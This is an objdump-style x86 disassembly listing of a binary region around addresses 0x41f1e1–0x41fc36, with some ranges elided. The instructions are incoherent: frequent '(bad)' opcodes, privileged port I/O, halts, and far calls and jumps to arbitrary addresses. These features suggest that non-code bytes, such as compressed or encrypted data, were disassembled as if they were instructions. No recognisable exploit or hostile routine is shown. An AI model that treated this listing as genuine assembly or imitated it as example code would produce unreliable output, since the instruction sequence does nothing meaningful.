  41f1e1:	sbb    ecx,DWORD PTR [edx-0x76acde47]
  41f1e7:	in     eax,0x78
  41f1e9:	outs   dx,DWORD PTR ds:[esi]
  41f1ea:	retf   0xbab6
  41f1ed:	es ds xor al,0x7d
  41f1f1:	push   esi
  41f1f2:	jl     0x41f232
  41f1f4:	adc    al,BYTE PTR [edi+0x5a]
  41f1f7:	int    0x8d
  41f1f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1fa:	pop    es
  41f1fb:	mov    edx,0x60250591
  41f200:	(bad)  
  41f201:	jl     0x41f230
  41f203:	mov    cl,0x14
  41f205:	xchg   al,dl
  41f207:	scas   eax,DWORD PTR es:[edi]
  41f208:	inc    esp
  41f209:	sbb    ebx,ecx
  41f20b:	push   edx
  41f20c:	sbb    BYTE PTR [edi],0x7
  41f20f:	lea    edi,[edi]
  41f211:	into   
  41f212:	jge    0x41f1ea
  41f214:	in     al,0x71
  41f216:	daa    
  41f217:	xor    BYTE PTR [esp+ecx*8-0x65e06dac],al
  41f21e:	cwde   
  41f21f:	xchg   esp,eax
  41f220:	mov    ds:0xb944389f,al
  41f225:	mov    bh,0x95
  41f227:	das    
  41f228:	or     DWORD PTR [esi],eax
  41f22a:	mov    cl,0x2b
  41f22c:	aam    0x42
  41f22e:	aam    0xa8
  41f230:	shr    BYTE PTR [ecx+0x41],cl
  41f233:	mov    ecx,0x9bc1455a
  41f238:	test   al,0xe
  41f23a:	in     eax,dx
  41f23b:	retf   
  41f23c:	(bad)  
  41f23d:	stc    
  41f23e:	mov    ds:0xf3d8a141,al
  41f243:	inc    ecx
  41f244:	sbb    al,0x81
  41f246:	iret   
  41f247:	call   DWORD PTR es:[eax+0x58483788]
  41f24e:	push   esp
  41f24f:	pop    edx
  41f250:	dec    edi
  41f251:	outs   dx,DWORD PTR ds:[esi]
  41f252:	ret    
  41f253:	imul   esp,DWORD PTR [edx],0x2c
  41f256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f257:	xor    bh,BYTE PTR [ebp-0x6eaa61f1]
  41f25d:	dec    ebp
  41f25e:	shl    ecx,0x5b
  41f261:	ret    
  41f262:	push   cs
  41f263:	enter  0x7d7a,0x41
  41f267:	sti    
  41f268:	adc    bh,BYTE PTR [ebp+0x4c]
  41f26b:	dec    esp
  41f26c:	addr16 popa 
  41f26e:	mov    esp,DWORD PTR [ecx-0x65]
  41f271:	inc    esp
  41f272:	outs   dx,DWORD PTR ds:[esi]
  41f273:	inc    eax
  41f274:	mov    DWORD PTR [esi-0x701dce03],esp
  41f27a:	jg     0x41f24d
  41f27c:	dec    ebx
  41f27d:	sub    DWORD PTR [ebp-0x18],ebp
  41f280:	mov    esp,0x25f315f4
  41f285:	dec    edx
  41f286:	inc    ecx
  41f287:	out    dx,al
  41f288:	(bad)  
  41f289:	rcl    DWORD PTR [esi],1
  41f28b:	test   al,0x6e
  41f28d:	dec    edx
  41f28e:	dec    ecx
  41f28f:	mov    eax,ds:0x3f772087
  41f294:	push   0xffffffe2
  41f296:	repnz mov ds:0x5d88710a,al
  41f29c:	adc    eax,0xaaa9bd26
  41f2a1:	daa    
  41f2a2:	ja     0x41f2b3
  41f2a4:	int3   
  41f2a5:	mov    WORD PTR ds:0xeb05ce3a,cs
  41f2ab:	(bad)  
  41f2ac:	shr    BYTE PTR [ebx+eax*2+0x6f],cl
  41f2b0:	data16 sbb ch,BYTE PTR [ecx-0x7ffc9de9]
  41f2b7:	pusha  
  41f2b8:	mov    ebp,0x83eab97b
  41f2bd:	cmp    bl,dl
  41f2bf:	loop   0x41f316
  41f2c1:	fld    QWORD PTR [eax]
	...
  41f333:	add    BYTE PTR [ecx-0xe088ee],cl
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0x6981:0xd19531a0
  41f343:	mov    DWORD PTR [eax+0x4f],eax
  41f346:	add    DWORD PTR [eax],eax
  41f348:	test   BYTE PTR [eax],0x0
  41f34b:	add    BYTE PTR [ebx],bh
  41f34d:	mov    cl,0x82
  41f34f:	enter  0x2b2,0x32
  41f353:	mov    ch,0xda
  41f355:	(bad)  
  41f356:	int    0x6
  41f358:	or     ebp,esi
  41f35a:	clc    
  41f35b:	jns    0x41f367
  41f35d:	loop   0x41f358
  41f35f:	shr    DWORD PTR [esi],1
  41f361:	test   BYTE PTR [esi+0x9],dl
  41f364:	repnz jecxz 0x41f347
  41f367:	sar    BYTE PTR [ecx+0x7fa6a998],0xa
  41f36e:	push   eax
  41f36f:	xlat   BYTE PTR ds:[ebx]
  41f370:	or     DWORD PTR [esi+0x25c3884c],esp
  41f376:	les    ebp,FWORD PTR [edi+esi*2-0x5ba3f604]
  41f37d:	mov    ds:0x9bcc7460,eax
  41f382:	cwde   
  41f383:	div    ebx
  41f385:	pop    es
  41f386:	repz add BYTE PTR [edx+ebp*4+0xbdb9cf1],dh
  41f38e:	nop
  41f38f:	jl     0x41f3af
  41f391:	outs   dx,DWORD PTR ds:[esi]
  41f392:	xor    ch,BYTE PTR [edx]
  41f394:	mov    DWORD PTR [esi-0x20f7a0b3],esi
  41f39a:	in     al,dx
  41f39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f39c:	aam    0x40
  41f39e:	aaa    
  41f39f:	xchg   dl,ah
  41f3a1:	pop    edi
  41f3a2:	hlt    
  41f3a3:	sahf   
  41f3a4:	pop    ecx
  41f3a5:	pop    ebx
  41f3a6:	lock fcmovnu st,st(3)
  41f3a9:	dec    ebx
  41f3aa:	and    ebp,DWORD PTR [ebx-0x32575664]
  41f3b0:	pcmpeqb mm6,QWORD PTR [ecx+0x3a]
  41f3b4:	dec    esi
  41f3b5:	loopne 0x41f388
  41f3b7:	or     ebx,DWORD PTR [edx+0x3]
  41f3ba:	cmp    BYTE PTR ds:0xf11be59,dh
  41f3c0:	int3   
  41f3c1:	add    esp,DWORD PTR [edx+0x20]
  41f3c4:	sub    BYTE PTR [ebx],0xc6
  41f3c7:	sub    BYTE PTR [ebp+0x47],bh
  41f3ca:	fbstp  TBYTE PTR [ecx+0x11]
  41f3cd:	shr    esp,1
  41f3cf:	mov    ch,0x74
  41f3d1:	mov    ch,0x76
  41f3d3:	fidiv  WORD PTR [edx]
  41f3d5:	lods   al,BYTE PTR ds:[esi]
  41f3d6:	outs   dx,BYTE PTR ds:[esi]
  41f3d7:	ss in  eax,dx
  41f3d9:	fdivr  DWORD PTR [esi-0x873f5e7]
  41f3df:	or     esi,ecx
  41f3e1:	(bad)  
  41f3e2:	fsub   DWORD PTR [ecx+eax*1-0x38665ed4]
  41f3e9:	mov    al,ds:0x3f73ad27
  41f3ee:	dec    ecx
  41f3ef:	mov    al,0xa8
  41f3f1:	jecxz  0x41f442
  41f3f3:	in     eax,0x9d
  41f3f5:	xor    cl,ch
  41f3f7:	push   0xeccca657
  41f3fc:	sbb    al,0x56
  41f3fe:	imul   esp,DWORD PTR [ebp+0x52],0x72f5af86
  41f405:	adc    eax,0xf7012957
  41f40a:	repz shl BYTE PTR [eax+ecx*1],0x58
  41f40f:	add    ch,dl
  41f411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f412:	pop    ebx
  41f413:	cdq    
  41f414:	fstp   DWORD PTR [esi-0x8714347]
  41f41a:	cs jmp 0xa626e70c
  41f420:	dec    eax
  41f421:	ss iret 
  41f423:	fs out dx,al
  41f425:	imul   DWORD PTR [ecx-0x2f]
  41f428:	pop    esi
  41f429:	dec    eax
  41f42a:	mov    al,0xb9
  41f42c:	cmp    edx,ebx
  41f42e:	adc    al,0xc7
  41f430:	lds    edi,FWORD PTR [esi-0x7a]
  41f433:	lahf   
  41f434:	adc    edi,DWORD PTR [eax-0x58]
  41f437:	cmp    al,0xe2
  41f439:	inc    edx
  41f43a:	add    DWORD PTR [ecx+0x32e45264],0xe5a4
	...
  41f4b4:	and    BYTE PTR [edx-0x35],ch
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0x5b
  41f4c1:	jb     0x41f463
  41f4c3:	mov    dl,0x36
  41f4c5:	push   eax
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	test   BYTE PTR [eax],0x0
  41f4cb:	add    BYTE PTR [ecx],al
  41f4cd:	pop    edi
  41f4ce:	adc    al,0x16
  41f4d0:	imul   esp,DWORD PTR [edx+0x2f676970],0x92f5628d
  41f4da:	mov    ecx,0x6813875e
  41f4df:	repnz popa 
  41f4e1:	es loopne 0x41f499
  41f4e4:	addr16 call 0x373db6d4
  41f4ea:	fisttp WORD PTR fs:[edx-0x47]
  41f4ee:	fwait
  41f4ef:	mov    ds:0x895a05,al
  41f4f4:	loopne 0x41f4c3
  41f4f6:	sti    
  41f4f7:	mov    eax,DWORD PTR [edi]
  41f4f9:	xor    eax,0x90fdff1b
  41f4fe:	(bad)  
  41f4ff:	enter  0xddc5,0xe5
  41f503:	mov    dl,0xd5
  41f505:	dec    esi
  41f506:	jne    0x41f4e6
  41f508:	ins    BYTE PTR es:[edi],dx
  41f509:	outs   dx,DWORD PTR ds:[esi]
  41f50a:	ja     0x41f565
  41f50c:	xor    al,0xc
  41f50e:	hlt    
  41f50f:	mov    ebp,0xe44d6e07
  41f514:	lock es mov ch,0x57
  41f518:	lea    ecx,[edi-0x1d5dce73]
  41f51e:	jp     0x41f4b8
  41f520:	sbb    al,BYTE PTR [ebx+0x58]
  41f523:	mov    al,ds:0x719a5456
  41f528:	outs   dx,BYTE PTR ds:[esi]
  41f529:	sbb    BYTE PTR [ebp-0xc],dh
  41f52c:	xor    BYTE PTR [ebx+0xe5ecef2],cl
  41f532:	cmp    esp,DWORD PTR [edi]
  41f534:	push   ds
  41f535:	cmp    ah,dh
  41f537:	jbe    0x41f4bc
  41f539:	fsqrt  
  41f53b:	rol    DWORD PTR ds:0xb2c6570c,1
  41f541:	daa    
  41f542:	dec    eax
  41f543:	mov    dh,BYTE PTR [edx+eiz*1]
  41f546:	fidiv  DWORD PTR [ebx+eax*1]
  41f549:	add    DWORD PTR [esp+eiz*2+0x7b],eax
  41f54d:	scas   eax,DWORD PTR es:[edi]
  41f54e:	xor    eax,0x8c1d284c
  41f553:	cli    
  41f554:	popa   
  41f555:	pop    ss
  41f556:	mov    edx,0x8b79a70d
  41f55b:	jbe    0x41f5c1
  41f55d:	out    0xf4,eax
  41f55f:	icebp  
  41f560:	(bad)
  41f563:	loope  0x41f5b7
  41f565:	das    
  41f566:	fstp   DWORD PTR [ebx-0x74bc61f8]
  41f56c:	(bad)  
  41f56e:	nop
  41f56f:	sub    bl,al
  41f571:	mov    bh,0xcb
  41f573:	call   0xe6579165
  41f578:	repz icebp 
  41f57a:	ret    
  41f57b:	mov    ah,0x9d
  41f57d:	xchg   ebx,eax
  41f57e:	iret   
  41f57f:	sub    edi,0xd3c08b87
  41f585:	xor    al,0xc
  41f587:	hlt    
  41f588:	cwde   
  41f589:	pop    ss
  41f58a:	or     bh,bl
  41f58c:	push   cs
  41f58d:	nop
  41f58e:	sbb    esi,edi
  41f590:	cs mov dh,0x18
  41f593:	sti    
  41f594:	sbb    cl,BYTE PTR [esp+ecx*1+0x1d3013e4]
  41f59b:	scas   eax,DWORD PTR es:[edi]
  41f59c:	pushf  
  41f59d:	pop    ss
  41f59e:	cld    
  41f59f:	fs or  eax,0x10844188
  41f5a5:	mov    ebx,0x47c00b3b
  41f5aa:	mov    al,ds:0xa5d840ac
  41f5af:	push   eax
  41f5b0:	icebp  
  41f5b1:	out    dx,eax
  41f5b2:	popf   
  41f5b3:	push   0x410d7763
  41f5b8:	retf   
  41f5b9:	es jns 0x41f62f
  41f5bc:	add    al,0xe6
  41f5be:	fidiv  WORD PTR [edi+0xfbb3]
	...
  41f634:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41f63a:	cmc    
  41f63b:	cwde   
  41f63c:	and    eax,0x2d01e835
  41f641:	int3   
  41f642:	mov    al,0x77
  41f644:	sub    al,0x51
  41f646:	add    DWORD PTR [eax],eax
  41f648:	test   BYTE PTR [eax],0x0
  41f64b:	add    BYTE PTR [esi-0x21a8acb8],ch
  41f651:	mov    esp,0x48e6d4a4
  41f656:	add    eax,0xa947ebad
  41f65b:	cmp    DWORD PTR [ebp+ebp*8-0x66],edx
  41f65f:	fistp  QWORD PTR [esi+0x63c771c5]
  41f665:	or     dl,bl
  41f667:	loopne 0x41f62e
  41f669:	sbb    bh,BYTE PTR [ecx-0x7a]
  41f66c:	pop    eax
  41f66d:	fnsave [ebp-0x52]
  41f670:	mov    ebx,0xd6f22910
  41f675:	je     0x41f606
  41f677:	jns    0x41f64e
  41f679:	aas    
  41f67a:	mov    ebp,0x8a742fd7
  41f67f:	(bad)  
  41f680:	shl    eax,cl
  41f682:	xor    eax,0x5dea2a28
  41f687:	xlat   BYTE PTR ds:[ebx]
  41f688:	int    0xc3
  41f68a:	cmp    bl,BYTE PTR [edi-0x56df898a]
  41f690:	pop    es
  41f691:	adc    al,0x57
  41f693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f694:	push   edx
  41f695:	mov    cl,0xc2
  41f697:	jecxz  0x41f6be
  41f699:	or     BYTE PTR [esi],ah
  41f69b:	test   eax,0x42a375d7
  41f6a0:	dec    esi
  41f6a1:	out    0xd5,eax
  41f6a3:	dec    esi
  41f6a4:	mov    bh,dh
  41f6a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6a7:	cmc    
  41f6a8:	(bad)  
  41f6a9:	and    al,0xc4
  41f6ab:	and    DWORD PTR [bx+di+0x3f],ebx
  41f6af:	push   ebx
  41f6b0:	xlat   BYTE PTR ds:[ebx]
  41f6b1:	aad    0xdf
  41f6b3:	pop    esp
  41f6b4:	jecxz  0x41f658
  41f6b6:	arpl   WORD PTR [eax],dx
  41f6b8:	in     al,dx
  41f6b9:	jae    0x41f725
  41f6bb:	inc    esi
  41f6bc:	cmp    bh,0x7a
  41f6bf:	xchg   edx,eax
  41f6c0:	or     ebx,DWORD PTR [edi+eax*8]
  41f6c3:	ja     0x41f681
  41f6c5:	outs   dx,BYTE PTR ds:[esi]
  41f6c6:	cs jg  0x41f6ea
  41f6c9:	(bad)
  41f6cc:	(bad)  
  41f6cd:	mov    WORD PTR [ebx+0x58],ss
  41f6d0:	xor    ecx,DWORD PTR [eax]
  41f6d2:	mov    ebp,ebx
  41f6d4:	dec    edx
  41f6d5:	sub    dl,BYTE PTR [ebx+0x51]
  41f6d8:	imul   ecx,ebx,0xffffffc2
  41f6db:	and    ah,BYTE PTR [edi+0x38b85bb8]
  41f6e1:	push   cs
  41f6e2:	push   esi
  41f6e3:	ins    BYTE PTR es:[edi],dx
  41f6e4:	xchg   ebx,eax
  41f6e5:	inc    edx
  41f6e6:	or     BYTE PTR [edi+edx*2-0x3d],dh
  41f6ea:	dec    esi
  41f6eb:	pop    eax
  41f6ec:	mov    eax,0x868b8180
  41f6f1:	sbb    BYTE PTR [ecx-0x7d],ah
  41f6f4:	aaa    
  41f6f5:	or     edi,DWORD PTR [ebp+0x6f5574ed]
  41f6fb:	or     eax,0xe00d16e8
  41f700:	cwde   
  41f701:	mov    cl,0xa9
  41f703:	daa    
  41f704:	cld    
  41f705:	mov    ebp,0x95983e14
  41f70a:	(bad)  
  41f70b:	out    dx,al
  41f70c:	aas    
  41f70d:	gs mov bl,0x69
  41f710:	and    BYTE PTR [ecx+0x1672dd82],dh
  41f716:	inc    ecx
  41f717:	stc    
  41f718:	xchg   dl,bl
  41f71a:	les    esi,FWORD PTR [eax]
  41f71c:	xchg   ecx,eax
  41f71d:	in     al,dx
  41f71e:	mov    ch,0xe4
  41f720:	mov    eax,0xc93f0a99
  41f725:	cmp    ebp,ebp
  41f727:	mov    dh,BYTE PTR [ebp-0x41]
  41f72a:	mov    ebp,DWORD PTR [edi-0x1a]
  41f72d:	jp     0x41f771
  41f72f:	inc    ecx
  41f730:	cmp    BYTE PTR [ecx+0x5b3089cd],dh
  41f736:	arpl   WORD PTR [eax+0x5c],di
  41f739:	fld    DWORD PTR [ecx]
  41f73b:	fisttp QWORD PTR [ecx+eax*1-0xc]
  41f73f:	scas   eax,DWORD PTR es:[edi]
  41f740:	test   eax,0x0
	...
  41f7b2:	add    BYTE PTR [eax],al
  41f7b4:	sub    eax,0x9e5c8a39
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	jmp    0x41f77f
  41f7c2:	jmp    0x1941a85
  41f7c7:	add    dh,dh
  41f7c9:	add    BYTE PTR [eax],al
  41f7cb:	add    BYTE PTR [esi-0x4b],bl
  41f7ce:	shl    edi,0x45
  41f7d1:	adc    BYTE PTR [edi-0x3a],al
  41f7d4:	(bad)  
  41f7d5:	mov    esi,0x97d2a61f
  41f7da:	sbb    DWORD PTR [ebx-0x30],ebp
  41f7dd:	add    eax,0x8a0782b2
  41f7e2:	or     dh,cl
  41f7e4:	in     eax,dx
  41f7e5:	xlat   BYTE PTR ds:[ebx]
  41f7e6:	inc    edi
  41f7e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7e8:	psubb  mm0,QWORD PTR [ebx+0x4f6298dd]
  41f7ef:	pop    ebp
  41f7f0:	js     0x41f831
  41f7f2:	loope  0x41f86c
  41f7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7f5:	add    DWORD PTR [ecx+0x5a],ebx
  41f7f8:	cmp    al,0x33
  41f7fa:	dec    esi
  41f7fb:	mov    al,0xbd
  41f7fd:	(bad)  
  41f7fe:	mov    esi,0xc292ad77
  41f803:	test   eax,0xb17a7672
  41f808:	sbb    DWORD PTR [edi+0x0],esp
  41f80b:	or     BYTE PTR [esi+0x63],bh
  41f80e:	inc    ebp
  41f80f:	fiadd  DWORD PTR [ecx+0x2f]
  41f812:	mov    ebx,0xe9631f3
  41f817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f818:	das    
  41f819:	and    DWORD PTR ds:[esi],eax
  41f81c:	cli    
  41f81d:	xor    cl,BYTE PTR [edi+edx*8-0x52d63fbe]
  41f824:	jecxz  0x41f7fe
  41f826:	loope  0x41f801
  41f828:	cmp    al,0xd
  41f82a:	lea    esp,[ebp+0x15eed025]
  41f830:	iret   
  41f831:	stos   DWORD PTR es:[edi],eax
  41f832:	push   bp
  41f834:	push   edx
  41f835:	int    0xce
  41f837:	sub    edx,eax
  41f839:	push   ss
  41f83a:	mov    eax,ds:0xb9ff5c8f
  41f83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f840:	add    eax,0x7ec4cbe2
  41f845:	mov    esi,ebp
  41f847:	scas   al,BYTE PTR es:[edi]
  41f848:	sbb    al,0xc4
  41f84a:	in     eax,0x52
  41f84c:	dec    eax
  41f84d:	in     eax,0x2d
  41f84f:	cli    
  41f850:	scas   eax,DWORD PTR es:[edi]
  41f851:	ss and bl,bh
  41f854:	test   BYTE PTR [edx],dh
  41f856:	add    edx,DWORD PTR [edx]
  41f858:	aaa    
  41f859:	push   esi
  41f85a:	mov    bh,0x37
  41f85c:	aad    0x2
  41f85e:	leave  
  41f85f:	mov    bh,BYTE PTR [ecx+0x10445f39]
  41f865:	push   cs
  41f866:	push   edi
  41f867:	imul   esi,DWORD PTR [edi-0x22],0xffffffb1
  41f86b:	xchg   ecx,eax
  41f86c:	mov    ds:0xcc09320e,al
  41f871:	loopne 0x41f7f4
  41f873:	pusha  
  41f874:	or     bl,bh
  41f876:	jbe    0x41f85e
  41f878:	sub    BYTE PTR [ebx-0x16],ch
  41f87b:	icebp  
  41f87c:	inc    esi
  41f87d:	cwde   
  41f87e:	jnp    0x41f86b
  41f880:	mov    edx,ebx
  41f882:	mov    WORD PTR [edx],ss
  41f884:	out    0x63,eax
  41f886:	adc    eax,0xd7ab50b2
  41f88b:	dec    ebp
  41f88c:	inc    ebx
  41f88d:	sub    al,0xa4
  41f88f:	fistp  WORD PTR [edx+0x75]
  41f892:	xor    ebp,esi
  41f894:	push   es
  41f895:	jns    0x41f8e4
  41f897:	sub    edx,DWORD PTR [ebp+0x58]
  41f89a:	pop    bp
  41f89c:	push   esp
  41f89d:	stc    
  41f89e:	push   ecx
  41f89f:	addr16 ror ch,0x94
  41f8a3:	(bad)  
  41f8a4:	mov    eax,0x2e6aba62
  41f8a9:	test   eax,0x228ea91a
  41f8ae:	rcr    DWORD PTR [edx-0x4d],0xa0
  41f8b2:	jmp    0xdc3d8e87
  41f8b7:	les    edx,FWORD PTR [edx+0x4d]
  41f8ba:	dec    ecx
  41f8bb:	or     al,0xe3
  41f8bd:	cwde   
  41f8be:	mov    edi,0x4b6ac
	...
  41f933:	add    BYTE PTR [eax-0x3],bh
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x459ffef7
  41f941:	and    al,0x2b
  41f943:	in     eax,0x18
  41f945:	push   ebx
  41f946:	add    DWORD PTR [eax],eax
  41f948:	test   BYTE PTR [eax],0x0
  41f94b:	add    ch,bh
  41f94d:	push   0x68ea0e88
  41f952:	push   edi
  41f953:	cmp    eax,0x74077719
  41f958:	mov    bh,0xea
  41f95a:	mov    ebx,0x73458af2
  41f95f:	out    0xa5,al
  41f961:	mov    edi,0xd9f60bac
  41f966:	call   0x12301aa6
  41f96b:	dec    edx
  41f96c:	xchg   BYTE PTR [eax],bh
  41f96e:	int    0x3d
  41f970:	mov    dh,0xb9
  41f972:	xchg   BYTE PTR [esi-0x23f6ddc4],bh
  41f978:	xor    ebx,edi
  41f97a:	pop    edx
  41f97b:	add    DWORD PTR [esi-0x19],esi
  41f97e:	adc    ch,BYTE PTR [eax]
  41f980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f981:	call   0x4bbf:0x124fb849
  41f988:	fmul   DWORD PTR [ecx+edx*8-0x7d4ae5f8]
  41f98f:	pushf  
  41f990:	xor    DWORD PTR [edx-0x2],ecx
  41f993:	aas    
  41f994:	dec    edi
  41f995:	pushf  
  41f996:	neg    al
  41f998:	(bad)  
  41f999:	sbb    ebp,DWORD PTR [ebp-0x6b]
  41f99c:	(bad)  
  41f99d:	pushf  
  41f99e:	adc    esp,ebx
  41f9a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a1:	push   ebp
  41f9a2:	enter  0x7c00,0x0
  41f9a6:	retf   0x60e9
  41f9a9:	dec    edx
  41f9aa:	push   edx
  41f9ab:	lods   al,BYTE PTR ds:[esi]
  41f9ac:	adc    DWORD PTR [ebx+0x5d],0xfffffffe
  41f9b0:	xor    BYTE PTR [ebx+0x223b2a91],bh
  41f9b6:	and    BYTE PTR [eax],bl
  41f9b8:	pop    ecx
  41f9b9:	js     0x41f95e
  41f9bb:	xor    eax,0x337738c7
  41f9c0:	loopne 0x41fa02
  41f9c2:	jo     0x41fa25
  41f9c4:	xor    eax,0x823f6e1f
  41f9c9:	jns    0x41f98a
  41f9cb:	and    cl,BYTE PTR [esi+esi*4+0x23]
  41f9cf:	loope  0x41f954
  41f9d1:	in     al,dx
  41f9d2:	jle    0x41fa25
  41f9d4:	mov    edi,ecx
  41f9d6:	jno    0x41fa56
  41f9d8:	jl     0x41f98e
  41f9da:	or     al,0x2e
  41f9dc:	xor    DWORD PTR [eax],ebp
  41f9de:	add    edi,DWORD PTR [edi]
  41f9e0:	mov    ebp,DWORD PTR [eax-0x588053b1]
  41f9e6:	inc    ebp
  41f9e7:	ds sbb eax,0x898082f
  41f9ed:	xchg   esi,eax
  41f9ee:	adc    BYTE PTR [edx],bh
  41f9f0:	jne    0x41f978
  41f9f2:	mov    ds:0x81de550e,eax
  41f9f7:	sub    BYTE PTR [edx],bl
  41f9f9:	push   es
  41f9fa:	xor    BYTE PTR [ebp+0x5c490529],ah
  41fa00:	add    al,BYTE PTR [eax+0x3e]
  41fa03:	pusha  
  41fa04:	stos   DWORD PTR es:[edi],eax
  41fa05:	jmp    0x41fa55
  41fa07:	lds    ebp,FWORD PTR [ebp+0x44]
  41fa0a:	lods   eax,DWORD PTR ds:[esi]
  41fa0b:	inc    edx
  41fa0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa0d:	stc    
  41fa0e:	mov    al,0xf3
  41fa10:	out    0xa3,eax
  41fa12:	jl     0x41fa47
  41fa14:	fsub   st(1),st
  41fa16:	push   es
  41fa17:	cmp    edx,DWORD PTR [edx-0x3a0bfc0a]
  41fa1d:	cmp    edi,DWORD PTR [esi-0x76]
  41fa20:	lea    ebp,[eax+ebp*2-0x3bfd9073]
  41fa27:	fst    QWORD PTR [ebx+0x7f187ec6]
  41fa2d:	push   ds
  41fa2e:	push   ebx
  41fa2f:	jmp    0x41fa4a
  41fa31:	outs   dx,DWORD PTR ds:[esi]
  41fa32:	mov    ch,0xde
  41fa34:	cs mov cl,0x95
  41fa37:	add    DWORD PTR [edi],ecx
  41fa39:	aam    0x95
  41fa3b:	cmp    al,0x29
  41fa3d:	mov    ebx,0xada41dbb
	...
  41fab2:	add    BYTE PTR [eax],al
  41fab4:	adc    ch,BYTE PTR [edi]
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	mov    edi,0xeb8038e
  41fac5:	push   esp
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	test   BYTE PTR [eax],0x0
  41facb:	add    bl,cl
  41facd:	jge    0x41fab4
  41facf:	sub    esp,eax
  41fad1:	adc    al,0x2c
  41fad3:	xor    edx,eax
  41fad5:	or     BYTE PTR [ebp+0x6f],bh
  41fad8:	jmp    0x6526:0x7010db3
  41fadf:	or     al,0x7b
  41fae1:	jmp    0xee0e096
  41fae6:	call   0x5d64dc07
  41faeb:	dec    edi
  41faec:	(bad)  
  41faed:	out    0x32,al
  41faef:	adc    eax,0x76c3a992
  41faf4:	mov    edx,0xd5e856ad
  41faf9:	leave  
  41fafa:	xlat   BYTE PTR ds:[ebx]
  41fafb:	je     0x41fb7a
  41fafd:	fs sub BYTE PTR es:[edx+0xcacf48f],cl
  41fb05:	aam    0x89
  41fb07:	fld    DWORD PTR [esi+edx*8-0xa]
  41fb0b:	rcl    DWORD PTR [eax],0xc0
  41fb0e:	jp     0x41fb5a
  41fb10:	mov    bh,0xc9
  41fb12:	cmc    
  41fb13:	imul   esp,ebp,0xffffffe5
  41fb16:	outs   dx,DWORD PTR ds:[esi]
  41fb17:	push   esp
  41fb18:	inc    esp
  41fb19:	not    BYTE PTR [ebp-0x21]
  41fb1c:	rcl    BYTE PTR [esi],0x9f
  41fb1f:	out    dx,eax
  41fb20:	cwde   
  41fb21:	add    al,0xe4
  41fb23:	iret   
  41fb24:	inc    edx
  41fb25:	stos   DWORD PTR es:[edi],eax
  41fb26:	fistp  WORD PTR [edi+0x235b5626]
  41fb2c:	fmul   QWORD PTR [edi+edx*1-0xc]
  41fb30:	add    ebp,edi
  41fb32:	je     0x41faf5
  41fb34:	nop
  41fb35:	idiv   DWORD PTR [edx]
  41fb37:	xor    BYTE PTR [eax],ah
  41fb39:	inc    ebx
  41fb3a:	push   es
  41fb3b:	mov    cl,0xc8
  41fb3d:	jg     0x41fbbe
  41fb3f:	add    DWORD PTR [eax],edi
  41fb41:	jne    0x41faf3
  41fb43:	pop    ecx
  41fb44:	inc    edx
  41fb45:	push   esi
  41fb46:	push   eax
  41fb47:	rcpps  xmm1,XMMWORD PTR [ebx-0x6d]
  41fb4b:	pop    ecx
  41fb4c:	xor    BYTE PTR [ecx],al
  41fb4e:	std    
  41fb4f:	lock in al,0x7e
  41fb52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb53:	out    dx,al
  41fb54:	outs   dx,DWORD PTR ds:[esi]
  41fb55:	cmp    al,0x67
  41fb57:	nop
  41fb58:	xchg   ecx,eax
  41fb59:	daa    
  41fb5a:	cmp    dh,bh
  41fb5c:	fcomp  QWORD PTR [eax+edx*2+0x12043831]
  41fb63:	pop    esp
  41fb64:	int    0x13
  41fb66:	fwait
  41fb67:	retf   0xe07
  41fb6a:	dec    eax
  41fb6b:	inc    eax
  41fb6c:	mov    ecx,0x6bf5d620
  41fb71:	sub    al,0xba
  41fb73:	aam    0x39
  41fb75:	mov    bh,BYTE PTR [eax-0x6b]
  41fb78:	stos   DWORD PTR es:[edi],eax
  41fb79:	push   0xf386c3c8
  41fb7e:	or     BYTE PTR [ecx],dh
  41fb80:	nop
  41fb81:	fcmovnb st,st(1)
  41fb83:	push   0x6240bd8
  41fb88:	and    eax,0x6489724
  41fb8d:	cli    
  41fb8e:	cmp    ah,bl
  41fb90:	adc    BYTE PTR [eax+0x36989f08],ch
  41fb96:	add    al,0x6
  41fb98:	scas   eax,DWORD PTR es:[edi]
  41fb99:	call   0x55c6ca92
  41fb9e:	xor    al,0xb0
  41fba0:	sub    ah,BYTE PTR [eax+ecx*1+0x59b9f3a4]
  41fba7:	test   DWORD PTR [edx-0x19],ecx
  41fbaa:	lea    ebp,[esp+ecx*8-0x42]
  41fbae:	cmc    
  41fbaf:	sub    al,0x25
  41fbb1:	call   0x4fbc:0xb042c8e1
  41fbb8:	loopne 0x41fbb4
  41fbba:	and    al,0xa
  41fbbc:	or     esp,edx
  41fbbe:	dec    edx
  41fbbf:	pushf  
  41fbc0:	and    eax,0x78
	...
  41fc31:	add    BYTE PTR [eax],al
  41fc33:	add    BYTE PTR [ecx-0xf],al
  41fc36:	(bad)
